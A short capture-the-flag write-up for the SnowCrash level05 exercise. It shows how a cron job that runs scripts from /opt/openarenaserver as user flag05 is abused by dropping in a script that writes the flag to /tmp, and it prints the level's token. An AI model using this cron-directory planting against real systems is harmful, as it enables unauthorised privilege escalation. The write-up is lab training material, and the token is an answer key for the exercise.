For this level, by searching a bit we found 2 files that we can maybe use.

	level05@SnowCrash:~$ find / -type f -iname level05 2>/dev/null
	/var/mail/level05
	/rofs/var/mail/level05

	level05@SnowCrash:~$ find / -user flag05 2>/dev/null
	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver	

We need to see what is inside it.

	level05@SnowCrash:~$ cat /var/mail/level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

	level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done
	level05@SnowCrash:~$

The level05 file make us understand that there is a cron job that run every 2 minutes,
it switch to user "flag05" and run the script located in "/usr/sbin/openarenaserver".

So we have to put a file to get the flag.
We cannot just "getflag" because we would not see the flag appear in the prompt due to the script running by flag05.

	echo "getflag > /tmp/flag" > /opt/openarenaserver/file

Now we need to wait maximum 2 minutes and go check the content of the flag file in /tmp.

	level05@SnowCrash:/tmp$ cat flag
	Check flag.Here is your token : viuaaale9huek52boumoomioc
